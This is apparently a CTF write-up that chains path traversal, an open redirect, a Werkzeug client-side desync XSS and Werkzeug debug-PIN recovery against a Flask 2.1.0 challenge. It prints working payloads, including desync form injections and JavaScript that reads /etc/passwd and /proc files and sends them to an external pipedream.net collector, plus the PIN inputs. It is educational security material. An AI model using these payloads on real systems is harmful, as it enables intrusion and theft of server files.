<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@api.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/ipc_download</span><span class="sh">'</span><span class="p">)</span>
<span class="nd">@is_authenticated</span>
<span class="k">def</span> <span class="nf">ipc_download</span><span class="p">(</span><span class="n">user</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">user</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span> <span class="o">!=</span> <span class="sh">'</span><span class="s">admin</span><span class="sh">'</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">response</span><span class="p">(</span><span class="sh">'</span><span class="s">Unauthorized</span><span class="sh">'</span><span class="p">),</span> <span class="mi">401</span>

    <span class="n">path</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">current_app</span><span class="p">.</span><span class="n">root_path</span><span class="p">,</span> <span class="n">current_app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">"</span><span class="s">UPLOAD_FOLDER</span><span class="sh">"</span><span class="p">])</span><span class="si">}{</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">file</span><span class="sh">"</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="sh">"</span><span class="s">rb</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
            <span class="n">file_content</span> <span class="o">=</span> <span class="nb">file</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
        <span class="k">return</span> <span class="nc">Response</span><span class="p">(</span><span class="n">file_content</span><span class="p">,</span> <span class="n">mimetype</span><span class="o">=</span><span class="sh">'</span><span class="s">application/octet-stream</span><span class="sh">'</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">response</span><span class="p">(</span><span class="sh">'</span><span class="s">Something Went Wrong!</span><span class="sh">'</span><span class="p">)</span>


</code></pre></div></div>

<p>This endpoint is responsible for sending the response of the ipc document submitted during profile update but as there is no check on the file param <code class="language-plaintext highlighter-rouge">request.args.get("file")</code> we could path traverse and read any file we want.
We can’t use this to read the flag directly as the flag has random name suffix to it and also this is only accessible by admin user.</p>

<p>If we want to read the response of this endpoint to read any file we would need a xss bu, which get’s executed in the bot’s browser so that we could access this endpoint and read the response.</p>

<p>The Upload IPC endpoint was also interesting:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@api.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/ipc_submit</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
<span class="nd">@is_authenticated</span>
<span class="k">def</span> <span class="nf">ipc_submit</span><span class="p">(</span><span class="n">user</span><span class="p">):</span>
    <span class="k">if</span> <span class="sh">'</span><span class="s">file</span><span class="sh">'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">request</span><span class="p">.</span><span class="n">files</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">response</span><span class="p">(</span><span class="sh">'</span><span class="s">Invalid file!</span><span class="sh">'</span><span class="p">)</span>
    
    <span class="n">ipc_file</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">files</span><span class="p">[</span><span class="sh">'</span><span class="s">file</span><span class="sh">'</span><span class="p">]</span>

    <span class="k">if</span> <span class="n">ipc_file</span><span class="p">.</span><span class="n">filename</span> <span class="o">==</span> <span class="sh">''</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">response</span><span class="p">(</span><span class="sh">'</span><span class="s">No selected file!</span><span class="sh">'</span><span class="p">),</span> <span class="mi">403</span>
    
    <span class="k">if</span> <span class="n">ipc_file</span> <span class="ow">and</span> <span class="nf">allowed_file</span><span class="p">(</span><span class="n">ipc_file</span><span class="p">.</span><span class="n">filename</span><span class="p">):</span>
        <span class="n">ipc_file</span><span class="p">.</span><span class="n">filename</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">user</span><span class="p">[</span><span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">]</span><span class="si">}</span><span class="s">.png</span><span class="sh">'</span>  <span class="c1"># [1]
</span>        <span class="n">ipc_file</span><span class="p">.</span><span class="nf">save</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">current_app</span><span class="p">.</span><span class="n">root_path</span><span class="p">,</span> <span class="n">current_app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">UPLOAD_FOLDER</span><span class="sh">'</span><span class="p">],</span> <span class="n">ipc_file</span><span class="p">.</span><span class="n">filename</span><span class="p">))</span> <span class="c1"># [2]
</span>        <span class="nf">update_ipc_db</span><span class="p">(</span><span class="n">user</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">])</span>

        <span class="k">return</span> <span class="nf">response</span><span class="p">(</span><span class="sh">'</span><span class="s">File submitted! Our moderators will review your request.</span><span class="sh">'</span><span class="p">)</span>
    
    <span class="k">return</span> <span class="nf">response</span><span class="p">(</span><span class="sh">'</span><span class="s">Invalid file! only png files are allowed</span><span class="sh">'</span><span class="p">),</span> <span class="mi">403</span>
</code></pre></div></div>

<p>On line [1], you could see <code class="language-plaintext highlighter-rouge">ipc_file.filename</code> value is taken from the username (which is controllable by the user) and then directly used in <code class="language-plaintext highlighter-rouge">path.join</code> operation.</p>

<p>This is bad practise as it leads to path traversal here also</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="sh">'</span><span class="s">/home/ubuntu</span><span class="sh">'</span><span class="p">)</span>
<span class="sh">'</span><span class="s">/home/ubuntu</span><span class="sh">'</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="sh">'</span><span class="s">/home/ubuntu</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">sudi</span><span class="sh">'</span><span class="p">)</span>
<span class="sh">'</span><span class="s">/home/ubuntu/sudi</span><span class="sh">'</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="sh">'</span><span class="s">/home/ubuntu</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">/sudi</span><span class="sh">'</span><span class="p">)</span>
<span class="sh">'</span><span class="s">/sudi</span><span class="sh">'</span>
</code></pre></div></div>

<p>If the username is like this <code class="language-plaintext highlighter-rouge">/username</code> then os.path.join operation will return <code class="language-plaintext highlighter-rouge">/username</code> instead (it will ignore everything what’s before) this would have allowed us to have arbitrary file write on the file system which we could we use to overwrite any template then get easy rce but as the application appends the extenion to it <code class="language-plaintext highlighter-rouge">f'{user["username"]}.png'</code> we can’t make use of this as we can;t do anything malicious by overwriting png files.</p>

<p>Examining the bot.py file we discover something:</p>

<p>The report endpoint takes the value from the id parameter but as there is no checks we can provide anything else also there.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@api.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/report</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
<span class="nd">@is_authenticated</span>
<span class="k">def</span> <span class="nf">report</span><span class="p">(</span><span class="n">user</span><span class="p">):</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">request</span><span class="p">.</span><span class="n">is_json</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">response</span><span class="p">(</span><span class="sh">'</span><span class="s">Missing required parameters!</span><span class="sh">'</span><span class="p">),</span> <span class="mi">401</span>
    
    <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="nf">get_json</span><span class="p">()</span>

    <span class="n">user_id</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">)</span>
</code></pre></div></div>

<p>bot.py</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">client</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">http://localhost:1337/login</span><span class="sh">"</span><span class="p">)</span>

    <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
    <span class="n">client</span><span class="p">.</span><span class="nf">find_element</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">ID</span><span class="p">,</span> <span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">).</span><span class="nf">send_keys</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
    <span class="n">client</span><span class="p">.</span><span class="nf">find_element</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">ID</span><span class="p">,</span> <span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">).</span><span class="nf">send_keys</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
    <span class="n">client</span><span class="p">.</span><span class="nf">execute_script</span><span class="p">(</span><span class="sh">"</span><span class="s">document.getElementById(</span><span class="sh">'</span><span class="s">login-btn</span><span class="sh">'</span><span class="s">).click()</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
    <span class="n">client</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">http://localhost:1337/profile/</span><span class="si">{</span><span class="nb">id</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span> <span class="o">//</span> <span class="p">[</span><span class="mi">3</span><span class="p">]</span>
    <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
</code></pre></div></div>

<p>On line [3] you could see the <code class="language-plaintext highlighter-rouge">id</code> is directly added to the url , this again could lead to path traversal. This one is interesing as we could chain this with the open redirect bug.
Let me explain the bot was restricted to visit the profile page only but due to the path traversal and open redirect bug we could make the bot visit any page we want.</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
    </span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"../go?to=https://atacker.com/"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>This gave more of a hint that the xss bug can be on any page instead of just the profile page.</p>

<p>We we started looking at the client side javascript code, to look for any xss sink:</p>

<p>At first this looked interesting:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">populateBots</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nx">sBots</span> <span class="o">=</span> <span class="nf">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">.exp-container</span><span class="dl">'</span><span class="p">).</span><span class="nf">data</span><span class="p">(</span><span class="dl">'</span><span class="s1">botExp</span><span class="dl">'</span><span class="p">);</span>

    <span class="kd">let</span> <span class="nx">botsHTML</span> <span class="o">=</span> <span class="s2">`&lt;div class="row justify-content-center"&gt;`</span><span class="p">;</span>

    <span class="k">for</span><span class="p">(</span><span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">botsData</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// [4]</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">sBots</span><span class="p">.</span><span class="nf">includes</span><span class="p">(</span><span class="nx">botsData</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">name</span><span class="p">))</span> <span class="p">{</span>
            <span class="nx">botsHTML</span> <span class="o">+=</span> <span class="s2">`
            &lt;div class='col-md-3 bots-col'&gt;
                &lt;img src='</span><span class="p">${</span><span class="nx">botsData</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">src</span><span class="p">}</span><span class="s2">' class='bots-img'&gt;
            &lt;/div&gt;`</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="nx">botsHTML</span> <span class="o">+=</span> <span class="s2">`&lt;/div&gt;`</span><span class="p">;</span>

    <span class="nf">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">.exp-container</span><span class="dl">'</span><span class="p">).</span><span class="nf">html</span><span class="p">(</span><span class="nx">botsHTML</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>[4] botsData is decalred inside this file http://localhost:1337/static/js/global.js</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">.</span><span class="nx">botsData</span> <span class="o">=</span> <span class="p">[</span>
    <span class="p">{</span>
       <span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">DisBot</span><span class="dl">"</span><span class="p">,</span>
       <span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">/static/images/bots/jake-parker-discord.png</span><span class="dl">"</span>
    <span class="p">}</span>
</code></pre></div></div>

<p>As the source is directly used in the jquery html sink we thought if we can clobber <code class="language-plaintext highlighter-rouge">window.botsData</code> we could get xss.But we couldn’t find any injection point.</p>

<p>Meanwhile my friend pointed out that the <code class="language-plaintext highlighter-rouge">/debug</code> endpoint has Werkzeug console exposed (as the application is running in debug mode), but we don’t know the pin.</p>

<p>This is where we came up with a plan how to solve this challenge by chaining all the pieces we already have.</p>

<p>Searching on google we found this blog https://www.daehee.com/werkzeug-console-pin-exploit/, which explains how you can genrate the PIN if you have a path traversal bug.By following this we should be able to get the PIN</p>

<p>Here’s how the attack will look:
Consider the xss endpoint to be <code class="language-plaintext highlighter-rouge">/xssendpoint</code></p>

<p>In the report endpoint, modify the id parameter in the request to <code class="language-plaintext highlighter-rouge">../go?to=/xssendpoint</code> . This will redirect the bot to the page where we have xss.Using the  xss bug make a request to the <code class="language-plaintext highlighter-rouge">/api/ipc_download?file=../../../../etc/passwd</code> endpoint and get the response and sent it to our controlled server. (we will fetch the necessary information needed to generate the pin)</p>

<hr />

<h1 id="xss">XSS</h1>

<p>We are still misisng an important piece to prove our attack , xss. At this point we were clueless then my friend pointed our that the challenge name relates <em>web desync</em> maybe we need to exploit this to get xss.
At that time we both remembered about seeing a new research by @kevin_mizu on <em>Abusing Client-Side Desync on Werkzeug</em> as we were dealing Werkzeug this looked very promising.</p>

<p>https://mizu.re/post/abusing-client-side-desync-on-werkzeug</p>

<p>Oxbla confirmed that it is ineeded vulnerable to desync attack. I was reading the research blog at that time as I am not good with this attack, the version mentioned in that blog was same as what was used in the challenge</p>

<p>requirements.txt</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Flask==2.1.0
Werkzeug==2.1.0
</code></pre></div></div>

<p>https://nvd.nist.gov/vuln/detail/cve-2022-29361</p>

<p>Mizu really went deep into his research and even undercover an interesting open redirect to demonstrate how this bug could could be chained together which will lead to account takeover.</p>

<p>I won’t go into the details as Mizu already explained everything very well in simple terms so make sure to read his research before continuing</p>

<p>This is the open redirect which I am talking about :</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET http://google.com HTTP/1.1
Host: localhost:1337
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36


</code></pre></div></div>

<p>Response:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 308 PERMANENT REDIRECT
Server: Werkzeug/2.1.0 Python/3.11.4
Date: Mon, 17 Jul 2023 15:18:31 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 262
Location: http://google.com/?
</code></pre></div></div>

<p>Again check the research blog if you want to know the root cause of this.</p>

<p>By using a form such as this:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">"x"</span> <span class="na">action=</span><span class="s">"http://localhost:1337/"</span>
    <span class="na">method=</span><span class="s">"POST"</span>
    <span class="na">enctype=</span><span class="s">"text/plain"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;textarea</span> <span class="na">name=</span><span class="s">"GET https://attacker.com HTTP/1.1
    Foo: x"</span><span class="nt">&gt;</span>Mizu<span class="nt">&lt;/textarea&gt;</span>
    <span class="nt">&lt;button</span> <span class="na">type=</span><span class="s">"submit"</span><span class="nt">&gt;</span>CLICK ME<span class="nt">&lt;/button&gt;</span>
    <span class="nt">&lt;/form&gt;</span>


<span class="nt">&lt;script&gt;</span> <span class="nx">x</span><span class="p">.</span><span class="nf">submit</span><span class="p">()</span> <span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p><img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/d13d01d6-84ca-4975-96f4-49e0c0796de5" alt="image" /></p>

<p>Upon submitting the above form this what happened:
<img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/7fdfcc5b-4f7d-4c6b-b3b7-16bbef90c0f8" alt="image" /></p>

<p><em>As we have a Client-Side Desync in Werkzeug, and this kind of attacks allows to control arbitrary bytes of the next request, it is possible to abuse it to recreate the open redirect payload from a malicious HTTP request.</em></p>

<p>Quoting this from Mizu’s blog what’s happening here is that the payload send in the request body is used in the next request</p>

<p>In our case the next request was made to http://localhost:1337/static/js/jquery.js , due to the bug in the parsing the request the server  instead of returning the original jquery.js code it returns a 308 redirect response to https://attacker.com (whatever code is returned by this server will be loaded in the page instead jquery.js) this give us a nice xss.</p>

<p>We can confirm this xss by adding this payload to our index.html file</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">alert</span><span class="p">()</span>
</code></pre></div></div>

<p><img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/4899cdfb-f18f-43bf-9c7b-61a01fbfad9d" alt="image" /></p>

<p>Great we have the xss now :)</p>

<p>Sample code to read any local file</p>

<p>index.html</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">fetch</span><span class="p">(</span><span class="dl">'</span><span class="s1">/api/ipc_download?file=../../../../etc/passwd</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span>
    <span class="na">credentials</span><span class="p">:</span> <span class="dl">'</span><span class="s1">include</span><span class="dl">'</span>
  <span class="p">})</span>
    <span class="p">.</span><span class="nf">then</span><span class="p">(</span><span class="nx">response</span> <span class="o">=&gt;</span> <span class="nx">response</span><span class="p">.</span><span class="nf">text</span><span class="p">())</span>
    <span class="p">.</span><span class="nf">then</span><span class="p">(</span><span class="nx">data</span> <span class="o">=&gt;</span> <span class="p">{</span>
      <span class="kd">const</span> <span class="nx">encodedData</span> <span class="o">=</span> <span class="nf">btoa</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
      <span class="kd">const</span> <span class="nx">url</span> <span class="o">=</span> <span class="s2">`https://en2celr7rewbul.m.pipedream.net/?flag=</span><span class="p">${</span><span class="nx">encodedData</span><span class="p">}</span><span class="s2">`</span><span class="p">;</span>
      <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="nx">url</span><span class="p">;</span>
    <span class="p">});</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /api/report HTTP/1.1
Host: 127.0.0.1:1337
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Content-Type: application/json
Content-Length: 94

{
  "id": "../go?to=http://8033-2409-4089-be8c-ddd4-add9-7e9b-206c-78fb.ngrok-free.app/test.html"
}
</code></pre></div></div>

<p>test.html contents</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">"x"</span> <span class="na">action=</span><span class="s">"http://localhost:1337/"</span>
    <span class="na">method=</span><span class="s">"POST"</span>
    <span class="na">enctype=</span><span class="s">"text/plain"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;textarea</span> <span class="na">name=</span><span class="s">"GET http://8033-2409-4089-be8c-ddd4-add9-7e9b-206c-78fb.ngrok-free.app HTTP/1.1
    Foo: x"</span><span class="nt">&gt;</span>Mizu<span class="nt">&lt;/textarea&gt;</span>
    <span class="nt">&lt;button</span> <span class="na">type=</span><span class="s">"submit"</span><span class="nt">&gt;</span>CLICK ME<span class="nt">&lt;/button&gt;</span>
    <span class="nt">&lt;/form&gt;</span>


<span class="nt">&lt;script&gt;</span> <span class="nx">x</span><span class="p">.</span><span class="nf">submit</span><span class="p">()</span> <span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/31372554/254163199-24f67c10-a553-4cf4-a363-36eea20310d5.png" alt="image" /></p>

<hr />

<p>To generate the PIN value on our end we need to know some values beforehand:</p>

<p>https://www.daehee.com/werkzeug-console-pin-exploit/</p>

<p>If you are interested in checking the source which generates the pin here it is: https://github.com/pallets/werkzeug/blob/main/src/werkzeug/debug/<strong>init</strong>.py#L138</p>

<p>We will be using this script to generate the pin: https://github.com/wdahlenburg/werkzeug-debug-console-bypass</p>

<p>As we have alocal setup most of the things we already know:</p>

<blockquote>
  <p>username is the user who started this Flask
root</p>
</blockquote>

<blockquote>
  <p>modname
flask.app</p>
</blockquote>

<blockquote>
  <p>getattr(app, ‘<strong>name</strong>’, getattr (app .__ class__, ‘<strong>name</strong>’))
Flask
getattr(mod, ‘<strong>file</strong>’, None) #is the absolute path of an app.py in the flask directory
/usr/local/lib/python3.11/site-packages/flask/app.py</p>
</blockquote>

<blockquote>
  <p>uuid.getnode()</p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat</span> /sys/class/net/eth0/address 
02:42:ac:11:00:04
root@9d0ff0081967:/app# python3
Python 3.9.7 <span class="o">(</span>default, Sep  3 2021, 02:02:37<span class="o">)</span> 
<span class="o">[</span>GCC 10.2.1 20210110] on linux
Type <span class="s2">"help"</span>, <span class="s2">"copyright"</span>, <span class="s2">"credits"</span> or <span class="s2">"license"</span> <span class="k">for </span>more information.
<span class="o">&gt;&gt;&gt;</span> <span class="s2">""</span>.join<span class="o">(</span><span class="s2">"02:42:ac:11:00:04"</span>.split<span class="o">(</span><span class="s2">":"</span><span class="o">))</span>
<span class="s1">'0242ac110004'</span>
<span class="o">&gt;&gt;&gt;</span> print<span class="o">(</span>0x0242ac110004<span class="o">)</span>
2485377892356

</code></pre></div></div>

<p>get_machine_id()</p>

<p>Machine Id: /etc/machine-id + /proc/sys/kernel/random/boot_id + /proc/self/cgroup
With the path traversal we can easily read the values of these files</p>

<p>Here’s the final payload to get all the required info:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="dl">""</span>
<span class="nx">files</span> <span class="o">=</span> <span class="p">[</span><span class="dl">"</span><span class="s2">/sys/class/net/eth0/address</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">/proc/sys/kernel/random/boot_id</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">/proc/self/cgroup</span><span class="dl">"</span><span class="p">]</span>




<span class="c1">// loop through files fetch and send to server</span>

<span class="nx">files</span><span class="p">.</span><span class="nf">forEach</span><span class="p">(</span><span class="nx">file</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="nf">fetch</span><span class="p">(</span><span class="s2">`/api/ipc_download?file=../../../../</span><span class="p">${</span><span class="nx">file</span><span class="p">}</span><span class="s2">`</span><span class="p">,</span> <span class="p">{</span>
        <span class="na">credentials</span><span class="p">:</span> <span class="dl">'</span><span class="s1">include</span><span class="dl">'</span>
    <span class="p">}).</span><span class="nf">then</span><span class="p">(</span><span class="nx">response</span> <span class="o">=&gt;</span> <span class="nx">response</span><span class="p">.</span><span class="nf">text</span><span class="p">())</span>
        <span class="p">.</span><span class="nf">then</span><span class="p">(</span><span class="nx">data</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="kd">const</span> <span class="nx">encodedData</span> <span class="o">=</span> <span class="nf">btoa</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
            <span class="kd">const</span> <span class="nx">url</span> <span class="o">=</span> <span class="s2">`https://en2celr7rewbul.m.pipedream.net/?flag=</span><span class="p">${</span><span class="nx">encodedData</span><span class="p">}</span><span class="s2">`</span><span class="p">;</span>
            <span class="nf">fetch</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>
        <span class="p">});</span>
<span class="p">});</span>
</code></pre></div></div>

<p>/sys/class/net/eth0/address</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt;&gt; "".join("02:42:ac:11:00:02".split(":"))
'0242ac110002'
&gt;&gt;&gt; print(0x0242ac110002)
2485377892354
</code></pre></div></div>

<p>/proc/sys/kernel/random/boot_id</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>d2ad6c68-ebf1-4090-85ff-60e0b7c2fb86
</code></pre></div></div>

<p>/proc/self/cgroup</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>12:blkio:/docker/97cb5dd0fb03213072481c8a621847f1a310238d2db0de37ac81c8116a509c3a
11:cpuset:/docker/97cb5dd0fb03213072481c8a621847f1a310238d2db0de37ac81c8116a509c3a
10:freezer:/docker/97cb5dd0fb03213072481c8a621847f1a310238d2db0de37ac81c8116a509c3a
</code></pre></div></div>

<p>machine id =&gt;</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>d2ad6c68-ebf1-4090-85ff-60e0b7c2fb8697cb5dd0fb03213072481c8a621847f1a310238d2db0de37ac81c8116a509c3a
</code></pre></div></div>

<p>/etc/machine_id can be ignored as this file doesn’t exist on our challenge server.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">probably_public_bits</span> <span class="o">=</span> <span class="p">[</span>
    <span class="sh">'</span><span class="s">root</span><span class="sh">'</span><span class="p">,</span><span class="c1"># username
</span>    <span class="sh">'</span><span class="s">flask.app</span><span class="sh">'</span><span class="p">,</span><span class="c1"># modname
</span>    <span class="sh">'</span><span class="s">Flask</span><span class="sh">'</span><span class="p">,</span><span class="c1"># getattr(app, '__name__', getattr(app.__class__, '__name__'))
</span>    <span class="sh">'</span><span class="s">/usr/local/lib/python3.11/site-packages/flask/app.py</span><span class="sh">'</span> <span class="c1"># getattr(mod, '__file__', None),
</span><span class="p">]</span>

<span class="n">private_bits</span> <span class="o">=</span> <span class="p">[</span>
    <span class="sh">'</span><span class="s">2485377892354</span><span class="sh">'</span><span class="p">,</span><span class="c1"># str(uuid.getnode()),  /sys/class/net/ens33/address 
</span>    <span class="c1"># Machine Id: /etc/machine-id + /proc/sys/kernel/random/boot_id + /proc/self/cgroup
</span>    <span class="sh">'</span><span class="s">d2ad6c68-ebf1-4090-85ff-60e0b7c2fb8697cb5dd0fb03213072481c8a621847f1a310238d2db0de37ac81c8116a509c3a</span><span class="sh">'</span>
<span class="p">]</span>
</code></pre></div></div>

<p>Now run the script werkzeug-pin-bypass.py and you will have the pin</p>

<p>You can see here that they are indeed same :)
<img src="https://user-images.githubusercontent.com/31372554/254167983-a0a1401b-cf80-4e17-b17f-94f8f1cb1635.png" alt="image" /></p>

<p>0xbla did all this scripting work in no time so thanks to him we were able to complete this challenge in no time.</p>

<p>And at last we had the flag</p>

